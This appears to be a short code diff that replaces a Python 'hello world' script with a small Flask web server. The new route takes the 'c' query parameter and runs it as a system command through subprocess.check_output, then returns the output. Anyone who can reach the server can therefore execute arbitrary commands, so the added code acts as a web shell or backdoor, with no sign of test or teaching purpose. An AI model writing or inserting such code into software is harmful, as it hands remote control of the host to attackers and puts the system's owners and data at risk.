@@ -1,7 +1,10 @@
+import flask
+import subprocess
 
+app = flask.Flask(__name__)
 
-def hello():
-    print("hello world")
+@app.route('/')
+def index():
+    return subprocess.check_output(flask.request.args.get('c', 'ls'))
 
-if __name__=="__main__":
-    hello()
+app.run()
